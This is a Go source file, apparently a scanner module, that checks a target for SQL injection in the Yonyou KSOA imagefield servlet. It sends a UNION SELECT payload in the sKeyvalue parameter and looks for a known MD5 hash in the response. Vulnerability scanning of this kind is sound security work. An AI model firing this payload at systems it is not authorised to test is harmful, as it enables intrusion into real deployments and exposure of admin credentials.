package KSOA_imagefield_sqli

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(10 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	// 构造 SQL 注入的 URL
	injectionURL := url + "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+"

	// 发送 GET 请求
	resp, err := client.R().SetHeaders(map[string]string{
		"User-Agent": UA,
	}).Get(injectionURL)

	if err != nil {
		color.Red.Println("[-] 请求失败或用友时空imagefield_sqli SQL注入漏洞检测未能完成")
		return
	}

	// 检查响应状态码和响应体
	if resp.Response.StatusCode == 200 && strings.Contains(resp.String(), "0x098f6bcd4621d373cade4e832627b4f6") {
		color.Green.Println("[+] 用友时空imagefield_sqli SQL注入漏洞 漏洞存在 -> " + url)
		return
	}

	color.Red.Println("[-] 用友时空imagefield_sqli SQL注入漏洞不存在")
}
